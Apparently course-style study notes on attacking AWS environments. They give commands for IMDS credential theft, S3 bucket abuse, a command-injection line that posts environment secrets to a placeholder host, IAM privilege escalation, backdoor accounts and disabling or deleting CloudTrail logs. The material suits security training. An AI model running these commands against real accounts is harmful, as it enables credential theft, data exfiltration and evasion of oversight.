		- Cloudsplaining is a tool used to analyze AWS Identity and Access Management (IAM) policies to identify potential security risks and vulnerabilities. Attackers can exploit weak or misconfigured IAM policies to escalate privileges, modify resources, or exfiltrate data. Cloudsplaining generates detailed HTML reports that highlight excessive permissions, helping security teams mitigate risks.
		- Steps to Enumerate Weak IAM Policies:
			- Step 1: Retrieve IAM Policy Details:
				- Use the AWS CLI to fetch information about IAM policies attached to users, groups, and roles:
				- aws iam get-account-authorization-details --output json > account-auth-details.json
				- This command exports IAM policy details into a JSON file named account-auth-details.json.
			- Step 2: Analyze IAM Policies with Cloudsplaining:
				- Run the following Cloudsplaining command to scan and analyze the exported IAM policies:
				- cloudsplaining scan --input-file account-auth-details.json --output ./cloudsplaining-report
				- This command processes the account-auth-details.json file and generates an analysis report in the specified output directory.
			- Step 3: Review the Report:
				- Navigate to the output directory and open the generated report in a web browser to review the identified weak IAM policies.
		- Note: Cloudsplaining does not require administrative privileges but does need read-only access to IAM policies and related resources.
	- Enumerating AWS Cognito:
		- AWS Cognito is a service provided by Amazon Web Services (AWS) that simplifies authentication, authorization, and user management for web and mobile applications. It supports user pools, which handle sign-up and sign-in functionalities, and identity pools, which create unique user identities and authorize access to AWS services.
		- Enumerating AWS Cognito involves gathering information about users and their attributes within user and identity pools. This process includes discovering user accounts, attributes, and other related information, which can be exploited by attackers. Threat actors may use this enumerated data to conduct phishing attacks, brute-force attempts, social engineering, data theft, service disruptions, and credential stuffing.
		- Enumerating User Pools:
			- Use the following commands to gather information about AWS Cognito user pools:
			- List all user pools: aws cognito-idp list-user-pools
			- Retrieve detailed information about a specific user pool: aws cognito-idp describe-user-pool --user-pool-id <UserPoolId>
		- Enumerating Identity Pools:
			- To enumerate AWS Cognito identity pools, execute the following commands:
			- List all identity pools: aws cognito-identity list-identity-pools
			- Retrieve detailed information about a specific identity pool: aws cognito-identity describe-identity-pool --identity-pool-id <IdentityPoolId>
		- Checking for Existing Users:
			- To determine whether a particular username already exists, attempt to sign up a new user with the following command: aws cognito-idp sign-up --client-id <ClientId> --username <username> --password Name=email,Value=<email>
		- Permissions Required:
			- Each command requires appropriate AWS Identity and Access Management (IAM) permissions:
			- For User Pools:
				- cognito-idp:ListUserPools
				- cognito-idp:DescribeUserPool
			- For Identity Pools:
				- cognito-identity:ListIdentityPools
				- cognito-identity:DescribeIdentityPool
		- These commands provide insights into the configuration and usage of Cognito within an AWS environment, potentially revealing misconfigurations or overly permissive settings.
	- Enumerating DNS Records of AWS Accounts Using Ghostbuster:
		- DNS records for AWS accounts are crucial for managing domain names and directing traffic to the appropriate resources within the AWS infrastructure. These records include A, CNAME, MX, and TXT records, which map domain names to IP addresses, define mail server routes, and provide verification for services such as Amazon Route 53.
		- Enumerating the DNS records of AWS accounts can allow attackers to uncover valuable infrastructure details, such as IP addresses, subdomains, and mail servers. Gaining insights into the DNS setup enables attackers to map the network, identify potential entry points, exploit misconfigurations, or target exposed services—potentially leading to unauthorized access to AWS resources. Tools such as nslookup, dig, and Ghostbuster can help in identifying DNS records associated with AWS accounts.
		- Ghostbuster (github.com):
			- Attackers use the Ghostbuster tool to gather DNS records from targeted AWS accounts, particularly those managed through Amazon Route 53. The tool can import DNS records from a CSV file or retrieve them directly from Cloudflare. Ghostbuster dynamically iterates through each AWS profile configured in .aws/config or .aws/credentials across all AWS regions. It pulls subdomain records from AWS Route 53 and Cloudflare and cross-checks these DNS records with the organization’s owned IPs to detect potential takeover opportunities.
			- Attackers can execute the following command to enumerate the DNS records of a targeted AWS account using Ghostbuster:
				- ghostbuster scan aws --profile <AWS_CLI_profile_name>
				- This command connects to the specified AWS account and retrieves all DNS records managed by Route 53.
			- Note: Ghostbuster leverages publicly available information from AWS Route 53 to gather DNS records. However, accessing certain DNS records may require specific permissions, depending on the security configurations and policies of the AWS account.
	- Enumerating Serverless Resources in AWS:
		- Serverless architectures automatically scale to handle large volumes of data collection and processing. Attackers can exploit this scalability to efficiently gather extensive information from distributed sources. To enumerate serverless resources in AWS—specifically AWS Lambda and DynamoDB—an attacker might use the following AWS CLI commands:
		- Enumerating AWS Lambda Functions:
			- List all Lambda functions: aws lambda list-functions
			- Retrieve details about a specific Lambda function, including its version: aws lambda get-function --function-name <function_name>
			- Examine the configuration details of a Lambda function, including environment variables: aws lambda get-function-configuration --function-name <function_name>
			- List the exposed URLs of a Lambda function for direct HTTP interactions: aws lambda list-function-url-configs --function-name <function_name>
			- Retrieve the configuration details of a specific Lambda function URL: aws lambda get-function-url-config --function-name <function_name>
			- Identify the event sources that trigger a Lambda function: aws lambda list-event-source-mappings --function-name <function_name>
		- Enumerating IAM Policies Related to Lambda:
			- List all managed policies attached to a target IAM role: aws iam list-attached-role-policies --role-name <role_name>
		- Enumerating AWS DynamoDB:
			- List all DynamoDB table names in the current account and region: aws dynamodb list-tables
			- Retrieve details of a specific DynamoDB table, including its status and metadata: aws dynamodb describe-table --table-name <table_name>
			- List all global DynamoDB tables: aws dynamodb list-global-tables
		- Enumerating API Gateway:
			- List all API Gateway REST APIs in the current account: aws apigateway get-rest-apis
			- Retrieve details about a specific REST API Gateway: aws apigateway get-rest-api --rest-api-id <api_id>
		- By leveraging the information extracted through these commands, attackers could execute various attacks, including privilege escalation, data exfiltration, resource hijacking, and API abuse.
	- Discovering Attack Paths Using Cartography (github.com):
		- Cartography is a Python-based tool designed to map and analyze the security posture of various cloud platforms, including AWS, GCP, Oracle Cloud Infrastructure, Microsoft Azure, and Okta. It ingests data from cloud infrastructure, IAM policies, and network configurations to create a comprehensive graph-based view. Attackers can exploit this information to identify relationships and dependencies, uncover misconfigurations, and pinpoint potential vulnerabilities for exploitation. By visualizing interconnected components, Cartography helps security teams recognize attack paths and privilege escalation opportunities.
		- Examples of Discovering Attack Paths in AWS:
			- Identify RDS instances in the current AWS account:
				MATCH (aws:AWSAccount)-[r:RESOURCE]->(rds:RDSInstance)
				RETURN *
				- This query instructs Neo4j to identify all [:RESOURCE] relationships from AWSAccount nodes to RDSInstance nodes and return the results.
			- Identify RDS instances with encryption turned off:
				MATCH (a:AWSAccount)-[:RESOURCE]->(rds:RDSInstance {storage_encrypted: false})
				RETURN a.name, rds.id
			- Identify EC2 instances that are directly exposed to the Internet:
				MATCH (instance:EC2Instance {exposed_internet: true})
				RETURN instance.instanceid, instance.publicdnsname
		- The instances identified by this query are open to the Internet due to permissive inbound IP permissions in their EC2 Security Groups or misconfigured network interfaces.
	- Tools for Collecting AWS Security-Focused Inventory:
		- Starbase (github.com)
		- Cloudlist (github.com)
		- AWS Recon (github.com)
		- aws-inventory (github.com)
		- CloudMapper (github.com)
	- Discovering Attack Paths Using CloudFox (github.com):
		- CloudFox is a command-line tool designed to help security professionals identify potential attack paths within cloud environments such as AWS, Azure, and GCP. It can be used to detect misconfigurations and security vulnerabilities, particularly in AWS. By using CloudFox, security teams can determine which regions an AWS account is utilizing and obtain a list of associated resources.
		- The tool scans for sensitive data in EC2 user data, service-specific environment variables, workloads with administrative permissions, role trusts, host names, IP addresses, and file systems within the targeted AWS infrastructure. Additionally, CloudFox assists in identifying over-permissive policies, exposed endpoints, and privilege escalation opportunities.
		- The following command can be executed via the AWS CLI to perform automated enumeration within an AWS environment:
			- cloudfox aws --profile <profile-name> all-checks
			- This command provides comprehensive details on security misconfigurations and potential attack paths within a specified AWS environment. It generates loot files containing enumerated information, including identified misconfigurations, which can aid in strengthening security postures.
		- Alternatively, the following CloudFox commands can be used to gather specific security insights:
			- Access Keys: Enumerates active access keys for all users. cloudfox aws --profile <profile-name> -v2 access-keys
			- Buckets: Displays all S3 buckets in the account and provides commands for further inspection: cloudfox aws --profile <profile-name> -v2 buckets
			- ECS Tasks: Returns details on ECS tasks, including associated clusters, task definitions, container instances, launch types, and IAM principals: cloudfox aws -p <profile-name> ecs-tasks -v2
			- Elastic Network Interfaces (ENIs): Identifies all elastic network interfaces, including ENI IDs, types, external and private IPs, VPC IDs, attached instances, and descriptions: cloudfox aws -p <profile-name> eni -v2
			- Endpoints: Enumerates exposed endpoints from various services: cloudfox aws --profile <profile-name> -v2 endpoints
			- Permissions: Lists all IAM permissions available to a principal, excluding resource-based permissions: cloudfox aws --profile <profile-name> permissions -v2
			- Secrets: Retrieves stored secrets from AWS Secrets Manager and AWS Systems Manager (SSM): cloudfox aws --profile <profile-name> -v2 secrets
			- Workloads: Identifies workloads with administrative permissions or those that can be escalated to administrative privileges: cloudfox aws --profile <profile-name> workloads
		- Note: While these commands do not require full administrative privileges, they do require specific IAM permissions. To execute them successfully, users must have the appropriate IAM policies attached to their roles or accounts.
	- Identify Security Groups Exposed to the Internet:
		- Attackers can exploit open security groups to gain unauthorized network access by targeting ports that allow unrestricted traffic. When security group rules permit inbound traffic from any IP address on commonly used ports—such as SSH (port 22), HTTP (port 80), HTTPS (port 443), or database ports (e.g., MySQL on port 3306)—these services become exposed to the Internet.
		- Attackers can scan for open ports and exploit them to launch brute-force attacks on SSH, gain control of instances, execute malicious commands, exfiltrate data, or establish persistence within the network. Additionally, open security groups can expose vulnerabilities such as SQL injection, cross-site scripting (XSS), or remote code execution (RCE), leading to unauthorized access, data breaches, and further penetration into the AWS environment.
		- Methods to Enumerate Open Security Groups in AWS:
			- Using the AWS Management Console:
				- Navigate to the EC2 Dashboard.
				- Select Security Groups from the sidebar.
				- Review the inbound and outbound rules for any security group that allows access from 0.0.0.0/0.
			- Using AWS CLI:
				- Run the following command to identify security groups with open ports exposed to the Internet:
					aws ec2 describe-security-groups \
						--filter Name=ip-permission.cidr,Values=0.0.0.0/0,::/0 \
						[--filter Name=ip-permission.from-port,Values=<port numbers>]
				- Explanation of the command:
					--filter Name=ip-permission.cidr,Values=0.0.0.0/0,::/0 filters security group rules that allow traffic from any IPv4 or IPv6 address.
					--filter Name=ip-permission.from-port,Values=<port numbers> filters security groups to those that allow traffic on specific ports.
		- Examining the FromPort and ToPort values in the command output helps identify risky open ports, which attackers can exploit to gain unauthorized access to an AWS environment.
		- Additionally, attackers can define unrestricted network access to a specific port using the following command: aws ec2 authorize-security-group-ingress --group-id <security group ID> --protocol <protocol> --port <port number> --cidr 0.0.0.0/0
		- Required IAM Permissions:
			- Executing these commands does not necessarily require full administrative privileges but does require appropriate IAM permissions. The necessary permission is: ec2:DescribeSecurityGroups
			- Users with the AmazonEC2ReadOnlyAccess policy or higher have sufficient privileges to run the command.
	- AWS Threat Emulation Using Stratus Red Team (github.com):
		- Stratus Red Team is the "Atomic Red Team™" for the cloud, enabling granular and self-contained emulation of offensive attack techniques. Attackers use Stratus Red Team to simulate various attack techniques in target cloud environments. This tool supports multiple platforms, including AWS, GCP, Azure, and Kubernetes. Inspired by the Atomic Red Team, it maps techniques to the MITRE ATT&CK framework, allowing security teams and attackers to conduct comprehensive and realistic security assessments to identify vulnerabilities. Stratus Red Team is self-contained and easy to use for various attack simulations.
		- Stratus Red Team Commands for AWS Attack Emulation:
			- To emulate attack techniques against AWS, the attacker must first authenticate before running any attack. This can be done using the aws-vault command or by configuring static credentials in ~/.aws/config and setting up the desired AWS profile using: export AWS_PROFILE=my-profile
			- Authentication:
				- Authenticate to AWS using: aws-vault exec sandbox-account
			- Listing Available Attack Techniques:
				- To list available attack techniques for the MITRE ATT&CK 'persistence' tactic in AWS: stratus list --platform AWS --mitre-attack-tactic persistence
			- Viewing Details of a Specific Attack Technique:
				- To view details of a specific technique: stratus show <Attack technique>
			- Warming Up an Attack Technique:
				- To prepare an attack technique by setting up the prerequisite infrastructure or configuration without executing it: stratus warmup <Attack technique>
			- Executing an Attack Technique:
				- To execute (detonate) an attack technique: stratus detonate <Attack technique>
			- Checking the Status of Attack Techniques:
				- To display the current state of attack techniques: stratus status
			- Cleaning Up After an Attack:
				- To clean up any leftover infrastructure from an attack technique: stratus cleanup <Attack technique>
				- To clean up all attack techniques: stratus cleanup --all
	- Gathering Cloud Keys Through IMDS Attacks (docs.aws.amazon.com):
		- In an AWS environment, cloud access keys are security credentials used by an IAM user or the root user of an AWS account to access AWS services. These keys consist of an access key ID and a secret access key, which are essential for authenticating API requests. Attackers exploit Instance Metadata Service (IMDS) vulnerabilities to obtain cloud keys and gain unauthorized access to cloud resources.
		- IMDSv1 allows access to instance metadata via HTTP requests to a specific IP address: 169.254.169.254. Attackers can leverage this to retrieve information about EC2 instances and their security credentials. For Nitro-based EC2 instances, an IPv6 address (fd00:ec2::254) can also be used.
		- IMDSv1 Exploitation:
			- To access the instance metadata and identify associated IAM roles, an attacker may run: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
			- Once an IAM role name is obtained, the attacker can retrieve its credentials using: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM-Role-Name>
		- IMDSv2 Exploitation:
			- AWS introduced IMDSv2 to mitigate these attacks by requiring a session token. However, attackers can still attempt to retrieve instance metadata if IMDSv2 is misconfigured.
			- Generate a session token with a specific duration (e.g., 21,600 seconds): TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
			- Use the generated token in subsequent requests: curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/
		- Mitigation Recommendations:
			- Enforce IMDSv2-only mode to prevent IMDSv1 exploitation.
			- Restrict IAM role permissions to follow the principle of least privilege.
			- Implement network-level controls to prevent unauthorized access to 169.254.169.254.
	- Exploiting Misconfigured AWS S3 Buckets:
		- Follow the steps below to exploit misconfigured AWS S3 buckets.
		- Step 1: Identify S3 Buckets:
			- Attackers use tools such as S3Scanner, lazys3, Bucket Finder, and s3-buckets-bruteforcer to locate target AWS S3 buckets. These tools help gather URLs of identified buckets.
			- For example, the URL of an identified S3 bucket may be: http://[bucket_name].s3.amazonaws.com/
		- Step 2: Set Up the AWS Command-Line Interface:
			- Install the AWS CLI (aws-cli) to check the AWS version and create an account.
		- Step 3: Extract Access Keys:
			- After creating an account, sign in and navigate to: AWS IAM Console
			- Go to Users -> Add User.
			- Fill in the required details and click Create User.
			- Download the CSV file and extract your access keys.
		- Step 4: Configure AWS CLI:
			- Open a terminal and run the following command to configure AWS CLI: aws configure
		- Step 5: Identify Vulnerable S3 Buckets:
			- Run the following commands to identify exploitable S3 buckets:
				- aws s3 ls s3://[bucket_name]
				- aws s3 ls s3://[bucket_name] --no-sign-request
		- Step 6: Exploit S3 Buckets:
			- Use the following commands to manipulate files stored in S3 buckets:
				- Reading Files: aws s3 ls s3://[bucket_name] --no-sign-request
				- Moving Files: aws s3 mv FileName s3://[bucket_name]/test-file.txt --no-sign-request
				- Copying Files: aws s3 cp FileName s3://[bucket_name]/test-file.svg --no-sign-request
				- Deleting Files: aws s3 rm s3://[bucket_name]/test-file.svg --no-sign-request
	- Compromising AWS IAM Credentials:
		- AWS Identity and Access Management (IAM) provides identity management capabilities to customers, enabling IT administrators to manage AWS user identities and their varying levels of access to AWS resources. Attackers can compromise AWS IAM user credentials by exploiting vulnerabilities and security flaws in cloud environments. Tools such as Pacu can be used to facilitate these attacks.
		- Below are some common security vulnerabilities that attackers exploit to compromise AWS IAM credentials:
		- Repository Misconfigurations:
			- Many organizations store their AWS keys in shared repositories on internal networks, such as Git repositories, allowing developers and engineers easy access. However, these keys may be misused by insiders or inadvertently exposed if developers unknowingly commit personal AWS keys to shared repositories.
			- For example, an environment variables file accidentally made public on GitHub may reveal AWS API keys to the internet. Users often upload such files with commit messages like "updated .gitignore," making them easy targets for attackers. While AWS scans GitHub commit messages for exposed API keys and notifies users when they are published, attackers may employ similar techniques to gain unauthorized access to cloud resources.
		- Social Engineering:
			- Attackers use social engineering techniques, such as phishing emails, fraudulent phone calls, and SMS messages, to trick users into revealing their AWS IAM credentials. If a user relies solely on API keys for authentication, an attacker can use a phishing attack to steal the keys and compromise the account.
		- Password Reuse:
			- Password reuse is a widespread issue that creates serious security vulnerabilities. Many users reuse the same password across multiple services. If an attacker compromises a password from one service, they may gain unauthorized access to other cloud services using the same credentials.
			- In some cases, if a website is breached, attackers can access its backend database, retrieve stored password hashes, or even find plaintext passwords, increasing the risk of credential compromise.
		- Vulnerabilities in AWS-Hosted Applications:
			- Server-Side Request Forgery (SSRF):
				- SSRF is a common web application vulnerability that allows attackers to send arbitrary web requests from compromised web servers. Attackers often target the internal EC2 metadata API through SSRF vulnerabilities in web applications.
				- When an EC2 instance requires access to the AWS API, it is often assigned an IAM instance profile, which grants temporary AWS credentials via the EC2 metadata API. If an attacker exploits an SSRF vulnerability, they can send HTTP requests to the metadata URL and obtain these temporary credentials.
			- Reading Local Files:
				- AWS keys are often stored in configuration and log files within the operating system. For example, users who configure the AWS Command Line Interface (AWS CLI) store their credentials in the home directory or environment variable files.
				- If an attacker gains access to the operating system, they can extract these stored credentials to further exploit the environment.
		- Exploiting Third-Party Software:
			- Many third-party applications require access to AWS environments to function properly. Organizations may deploy such software for cloud management, security, or automation. However, if an attacker compromises third-party software, they can gain unauthorized access to cloud resources.
			- For instance, an organization might use a third-party password manager to store credentials for various cloud services. If the password manager is compromised, an attacker could obtain high-level access to the cloud environment.
		- Insider Threats:
			- Insider threats typically originate from business associates, current or former employees, or trusted contractors who already have access to the environment. Unlike external attackers, they do not need to compromise credentials to carry out malicious activities.
			- For example, a disgruntled employee may attempt to damage the organization's reputation by abusing their credentials to modify cloud services or expose sensitive information to the public.
	- Hijacking Misconfigured IAM Roles Using Pacu (github.com):
		- AWS IAM policies, such as AssumeRole permissions, offer flexibility; however, misconfigurations in role permissions can create security vulnerabilities. For instance, if a role is configured with "AWS": "*", any user with a valid AWS account can assume the role and obtain its credentials.
		- Attackers leverage tools like Pacu, an open-source AWS exploitation framework, to enumerate and hijack IAM roles. This tool includes a built-in wordlist of over 1,100 commonly used role names. It automatically alerts the attacker when a role is identified, detects misconfigured roles, auto-assumes them, and exposes role credentials.
		- To assume roles, attackers can execute the following Pacu script after obtaining the target account ID: assume_role_enum.py [-h] [-p PROFILE] [-w WORD_LIST] -I ACCOUNT_ID
		- As shown in the figure, Pacu initiates role enumeration on a target account and identifies restricted roles such as "5" and "ADS", as well as the misconfigured role "APIGateway". The script then assumes the role and exposes its credentials in JSON format. Attackers can use these credentials to conduct further targeted attacks.
	- Scanning AWS Access Keys Using DumpsterDiver (github.com):
		- DumpsterDiver enables security researchers and attackers to scan a large variety of file types for hardcoded secret keys, such as AWS access keys, SSL certificates, and Microsoft Azure keys. It also allows users to define custom conditional search rules. This tool is commonly used to identify potential secret leaks and hardcoded credentials in cloud service configurations.
		- Running DumpsterDiver:
			- Use the following command to scan for AWS access keys:
				DumpsterDiver.py [-h] -p LOCAL_PATH [-r] [-a] [-s] [-l [0,3]] [-o OUTFILE]
					[--min-key MIN_KEY] [--max-key MAX_KEY] [--entropy ENTROPY]
					[--min-pass MIN_PASS] [--max-pass MAX_PASS]
					[--pass-complex {1,2,3,4,5,6,7,8,9}]
					[--grep-words GREP_WORDS [GREP_WORDS ...]]
					[--exclude-files EXCLUDE_FILES [EXCLUDE_FILES ...]]
					[--bad-expressions BAD_EXPRESSIONS [BAD_EXPRESSIONS ...]]
			- Command Parameters
				-p LOCAL_PATH -> Specifies the path to the folder containing files to be analyzed.
				-r, --remove -> Removes files that do not contain secret keys.
				-a, --advance -> Uses advanced analysis based on rules defined in rules.yaml.
				-s, --secret -> Searches for hardcoded passwords within the files.
				-o OUTFILE -> Exports the results in JSON format.
		- Example Commands:
			- Scanning directory for potential secrets:
				- dumpsterDiver -p /path/to/scan
				- DumpsterDiver scans the specified directory or archive, looking for patterns associated with sensitive information. In the case of AWS access keys, it searches for strings that match a predefined format, such as AKIA followed by 16 alphanumeric characters.
			- Scanning a directory specifically for AWS keys:
				- dumpsterDiver -p /path/to/scan -e AWS_KEY
				- Once the scan is complete, DumpsterDiver generates a report containing the paths of files where potential secrets were found. This report helps users assess and mitigate security risks by identifying exposed credentials.
	- Exploiting Docker Containers on AWS Using the Cloud Container Attack Tool (CCAT) (github.com):
		- Attackers use compromised AWS credentials to exploit Amazon Elastic Container Service (ECS) and Amazon Elastic Container Registry (ECR).
		- Steps Involved in Exploiting AWS Docker Containers:
			- Step 1: Abusing AWS Credentials:
				- Attackers leverage compromised AWS credentials to explore the AWS cloud environment and identify available ECR repositories. CCAT provides the "Enumerate ECR" module to list the details of accessible ECR repositories.
			- Step 2: Pulling the Target Docker Image:
				- From the list of identified ECR repositories, attackers locate and pull the Docker image belonging to the target organization. The "Pull Repos from ECR" module in CCAT enables attackers to retrieve the desired repository.
			- Step 3: Creating a Backdoored Image:
				- After extracting the Docker image from the ECR repository, attackers modify it by embedding a backdoor for a reverse shell. The "Docker Backdoor" module in CCAT allows attackers to replace the default CMD command with a malicious reverse shell backdoor.
			- Step 4: Pushing the Backdoored Docker Image:
				- Once modified, attackers upload the compromised Docker image back to the ECR repository. CCAT provides the "Push Repos to ECR" module to facilitate the upload of the altered Docker image.
	- Exploiting Shadow Admins in AWS:
		- Shadow admins are user accounts with specific permissions that allow attackers to infiltrate a target cloud network. However, attackers can only exploit shadow admins after gaining initial access to the target environment. Once inside, they abuse shadow admin permissions to escalate privileges and take control of the cloud infrastructure.
		- Below are some techniques attackers use to exploit shadow admin permissions:
			- Elevating Access Permissions:
				- Attackers exploit the Microsoft.Authorization/elevateAccess/Action permission to escalate their privileges to those of an administrator account.
			- Modifying Existing Roles:
				- With the Microsoft.Authorization/roleDefinitions/write permission, attackers can modify existing roles or create new admin accounts.
			- Creating New Accounts:
				- Attackers with the Microsoft.Authorization/roleAssignments/write permission can assign privileged roles to new accounts, effectively granting administrative control.
		- Additionally, attackers can leverage custom roles to create shadow admin accounts. For example, the custom role "Storage Team Leader" is a full subscription administrator. Attackers can abuse permissions such as Microsoft.Authorization/roleAssignments/*, using the AssignableScopes subscription to grant additional permissions to an account.
		- Tools for Identifying and Exploiting Shadow Admins:
			- SkyArk (github.com): SkyArk includes two main scanning modules, AWStealth and AzureStealth. These modules help attackers identify users, groups, and roles with the most sensitive and high-risk permissions, making them prime targets for privilege escalation.
	- Gaining Access by Exploiting SSRF Vulnerabilities:
		- Attackers can exploit Server-Side Request Forgery (SSRF) vulnerabilities in a web application that hosts a cloud service to retrieve AWS credentials for a role. They can then add these credentials to the local AWS CLI, access S3 buckets, and exfiltrate data stored in them.
		- Exploiting SSRF to Retrieve AWS IAM Credentials:
			- Attackers leverage SSRF vulnerabilities in web applications to access cloud metadata services, such as AWS EC2, and obtain AWS access keys for a role. These keys enable attackers to list and sync S3 buckets to a local machine, gaining unauthorized access to stored data.
			- This attack is feasible when:
				- The target web application communicates over HTTP.
				- The application has an SSRF vulnerability in a GET parameter (e.g., url).
		- Adding Compromised Credentials to AWS CLI:
			- Once the AWS credentials are obtained, they can be added to the local AWS CLI using the following command: aws configure --profile stolen_profile
		- Accessing Data Stored in S3 Buckets:
			- To verify that the credentials are valid, run: aws sts get-caller-identity --profile stolen_profile
				- This command retrieves the user ID, account number, and ARN for the compromised role.
			- Next, list all accessible S3 buckets: aws s3 ls --profile stolen_profile
				- This displays all S3 buckets that the compromised IAM role can access.
			- Finally, synchronize and download the bucket contents to the local system: aws s3 sync s3://bucket-name /home/attacker/localstash/targetcloud/ --profile stolen_profile
	- Attacks on AWS Lambda:
		- Since serverless functions run without a managed server, they are vulnerable to various application-level attacks such as DDoS, command injection, and cross-site scripting (XSS). Attackers can exploit AWS Lambda functions to gain privileges and compromise the confidentiality of an account.
		- Attackers can abuse Lambda functions through two primary scenarios, discussed below.
		- Black-Box Scenario:
			- In a black-box scenario, attackers make assumptions about a system’s features without prior knowledge of its internal workings or environment.
			- Steps to perform an attack using the black-box scenario:
				- Accessing a misconfigured S3 bucket: The attacker identifies an S3 bucket without proper credential enforcement. This bucket may contain sensitive organizational files.
				- Uploading files to the S3 bucket: The attacker uploads files to S3 and verifies misconfigurations.
				- Using AWS Lambda to analyze files: The attacker triggers a Lambda function that calculates file tags.
				- Exfiltrating cloud credentials: The attacker extracts AWS cloud credentials from the environment and uses them to enumerate for higher privileges.
			- AWS CLI Commands for the Attack:
				- List objects within a specific S3 bucket: aws s3 ls prod-file-bucket-eu
				- Retrieve object tags and useful metadata: aws s3api get-object-tagging --bucket prod-file-bucket-eu --key config161.zip
				- Establish a connection with an EC2 instance and execute arbitrary commands: aws s3 cp config.zip 's3://prod-file-bucket-eu/screen;curl -X POST -d "testCurl" <Target IP>:443;'
				- Extract AWS credentials using the environment variables: aws s3 cp config.zip 's3://prod-file-bucket-eu/screen;curl -X POST -d "`env`" <Target IP>:443;.zip'
		- White-Box Scenario:
			- In a white-box scenario, attackers already possess information about the target environment, making it easier to execute targeted attacks.
			- Steps to perform an attack using the white-box scenario:
				- Obtaining credentials: The attacker acquires user credentials through phishing or other social engineering techniques.
				- Identifying misconfigured S3 buckets: The attacker gathers information on roles and policies associated with the compromised cloud account, focusing on misconfigured S3 buckets.
				- Listing AWS Lambda functions: The attacker enumerates Lambda functions and obtains metadata about them.
				- Downloading and analyzing Lambda code: With the acquired credentials, the attacker downloads the Lambda function’s code to analyze it for potential vulnerabilities.
				- Exploiting the Lambda function: Using the identified vulnerabilities, the attacker launches further attacks against the cloud infrastructure.
			- AWS CLI Commands for the Attack:
				- List attached user policies for an account: aws iam list-attached-user-policies --user-name operator
				- List Lambda functions and identify associated roles: aws lambda list-functions
				- Retrieve Lambda function details, including download paths: aws lambda get-function --function-name corpFuncEasy
	- AWS IAM Privilege Escalation Techniques (rhinosecuritylabs.com):
		- After gaining access to a target cloud environment, attackers attempt to exploit their privileges to expand their attack surface and escalate their access for further exploitation.
		- Below are several techniques attackers use to escalate AWS IAM privileges:
		- Create a New Policy Version:
			- Attackers with the iam:CreatePolicyVersion permission can create a new version of an existing IAM policy with elevated permissions. By using the --set-as-default flag while creating the policy, they can activate the new version without requiring iam:SetDefaultPolicyVersion permissions. This method allows attackers to gain high-level administrator access to the AWS account.
		- Set an Existing Policy Version as Default:
			- If attackers have the iam:SetDefaultPolicyVersion permission, they can escalate privileges by switching the active policy version to an existing non-default version that grants higher privileges. This enables them to elevate their access to the level specified in the unused policy version.
		- Create an EC2 Instance with an Existing Instance Profile:
			- Attackers with iam:PassRole and ec2:RunInstances permissions can launch a new EC2 instance using an existing instance profile. Once the instance is running, they can retrieve AWS credentials from the instance metadata and assume the permissions assigned to that profile, potentially gaining elevated access.
		- Create a New User Access Key:
			- Attackers with the iam:CreateAccessKey permission can generate new access key IDs and secret access keys for an IAM user. This allows them to assume all the permissions of that user.
		- Create or Update a Login Profile:
			- If attackers have iam:CreateLoginProfile permissions, they can create new AWS Management Console login credentials for an IAM user. Similarly, with iam:UpdateLoginProfile, they can modify existing login profiles. In both cases, attackers gain access to AWS resources using the target user's privileges.
		- Attach a Policy to a User, Group, or Role:
			- With the following permissions, attackers can escalate their privileges by attaching policies that grant additional permissions:
				- iam:AttachUserPolicy – Attaches a policy to an IAM user.
				- iam:AttachGroupPolicy – Attaches a policy to an IAM group.
				- iam:AttachRolePolicy – Attaches a policy to an IAM role.
			- By attaching a high-privilege policy to a compromised user, group, or role, attackers can elevate their permissions.
		- Create or Update an Inline Policy for a User, Group, or Role:
			- Attackers with the following permissions can create or modify inline policies, granting themselves elevated access:
				- iam:PutUserPolicy – Adds or updates an inline policy for a user.
				- iam:PutGroupPolicy – Adds or updates an inline policy for a group.
				- iam:PutRolePolicy – Adds or updates an inline policy for a role.
			- This technique allows attackers to assign themselves full administrative privileges.
		- Add Themselves to an IAM Group:
			- If attackers have the iam:AddUserToGroup permission, they can add themselves to an existing IAM group with higher privileges. This enables them to inherit all permissions associated with that group.
	- Creating Backdoor Accounts in AWS:
		- Attackers can establish backdoor accounts in an AWS cloud environment by creating rogue AWS accounts. They exploit existing resources by modifying policies or abusing APIs and AWS Resource Access Manager (RAM). Tools such as Endgame and Pacu enable attackers to create backdoor accounts within an AWS environment.
		- Endgame (github.com):
			- Endgame is an exploitation framework that allows attackers to gain control over an AWS cloud environment through a rogue account and establish backdoor access. Using its full suite of capabilities, attackers can generate a list of backdoor accounts within the targeted AWS cloud environment.
			- This post-exploitation tool requires access to AWS API credentials from a user account with the necessary privileges to modify resource policies.
			- Endgame can create backdoor accounts for various AWS resources, as shown in the screenshot below:
			- List IAM resources associated with the user account: endgame list-resources -s iam
			- List S3 buckets: endgame list-resources --service s3
			- List resources across all AWS services: endgame list-resources --service all
			- Create a backdoor for a specific resource: endgame expose --service iam --name test-resource-exposure
	- Maintaining Access and Covering Tracks in an AWS Cloud Environment by Manipulating the CloudTrail Service:
		- After gaining administrator-level access to cloud resources, attackers manipulate CloudTrail logs to remain undetected and maintain persistent access to the compromised environment. In AWS, user activities are monitored through the CloudTrail service. The first action an attacker takes after gaining high-level access is to hide their tracks.
		- By default, the CloudTrail service is disabled. An administrator must explicitly enable CloudTrail and configure trails to monitor user activities. Attackers may disable logging by pausing the CloudTrail service and then resume it after executing their attack.
		- To stop logging via CloudTrail, an attacker may run the following command: $ aws cloudtrail stop-logging --name targetcloud_trail --profile administrator
		- To check the trail status, the following command can be used: $ aws cloudtrail get-trail-status --name targetcloud_trail --profile administrator
		- After disabling CloudTrail, attackers can carry out various malicious activities, such as:
			- Creating backdoor IAM users
			- Exfiltrating sensitive data
			- Running cryptocurrency mining scripts
		- Once the attack is completed, logging can be re-enabled using: $ aws cloudtrail start-logging --name targetcloud_trail --profile administrator
		- In some cases, attackers may attempt to permanently remove trails by executing: $ aws cloudtrail delete-trail --name targetcloud_trail --profile administrator
		- Alternatively, they may delete the contents of the S3 bucket storing the logs with: $ aws s3 rb s3://<Bucket_Name or Bucket_Reference> --force --profile administrator
		- Once the bucket contents are deleted, CloudTrail stops logging events. However, stopping or removing trails to erase tracks may trigger security alerts, as shown in the figure below.
		- Other Techniques Attackers Use to Cover Their Tracks:
